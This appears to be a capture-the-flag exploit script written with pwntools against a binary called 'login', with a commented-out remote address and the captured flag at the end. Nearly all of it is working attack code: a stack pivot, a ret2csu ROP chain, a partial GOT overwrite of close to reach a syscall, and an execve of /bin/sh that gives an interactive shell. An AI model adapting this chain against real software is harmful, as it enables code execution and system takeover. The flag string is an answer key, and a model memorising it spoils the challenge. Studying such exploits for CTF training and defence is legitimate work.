from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('./login')
# io = remote('129.211.173.64', 10005)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./login')

main = 0x40119a
csu1 = 0x40128A
csu2 = 0x401270
leave = 0x40121f
gadget = 0x4011ed
read_got = 0x404030
close_got = 0x404028
fake_stack = 0x404090

''' csu2
.text:0000000000401270 loc_401270:
.text:0000000000401270 mov     rdx, r14
.text:0000000000401273 mov     rsi, r13
.text:0000000000401276 mov     edi, r12d
.text:0000000000401279 call    qword ptr [r15+rbx*8]
.text:000000000040127D add     rbx, 1
.text:0000000000401281 cmp     rbp, rbx
.text:0000000000401284 jnz     short loc_401270
'''

''' csu1
.text:0000000000401286 loc_401286:
.text:0000000000401286 add     rsp, 8
.text:000000000040128A pop     rbx
.text:000000000040128B pop     rbp
.text:000000000040128C pop     r12
.text:000000000040128E pop     r13
.text:0000000000401290 pop     r14
.text:0000000000401292 pop     r15
.text:0000000000401294 retn
'''


io.recvline()
io.send(b'\x00' * 0x100 + p64(fake_stack + 0x100) + p64(gadget))

payload = b''
payload += p64(csu1)
payload += p64(0)               # rbx
payload += p64(1)               # rbp
payload += p64(0)               # r12 -> edi
payload += p64(close_got)       # r13 -> rsi
payload += p64(0x1)             # r14 -> rdx
payload += p64(read_got)        # r15
payload += p64(csu2)            # call [r15 + rbx * 8]
payload += p64(0)               # nouse, for `add rsp, 8;`

payload += p64(0)               # rbx
payload += p64(1)               # rbp
payload += p64(0)               # r12 -> edi
payload += p64(fake_stack)      # r13 -> rsi
payload += p64(0x3B)            # r14 -> rdx
payload += p64(read_got)        # r15
payload += p64(csu2)            # call [r15 + rbx * 8]
payload += p64(0)               # nouse, for `add rsp, 8;`

payload += p64(0)               # rbx
payload += p64(1)               # rbp
payload += p64(fake_stack)      # r12 -> edi
payload += p64(0)               # r13 -> rsi
payload += p64(0)               # r14 -> rdx
payload += p64(close_got)       # r15
payload += p64(csu2)            # call [r15 + rbx * 8]

io.send(payload.ljust(0x100, b'\x00') + p64(fake_stack - 0x8) + p64(leave))

io.send(b'\x85')

gdb.attach(io)

io.send(b'/bin/sh'.ljust(0x3B, b'\x00'))

pause()

io.sendline('exec 1>&0')

io.interactive()

# flag{c6f79b51a8c6ebd398d3e7d67afaa29b}

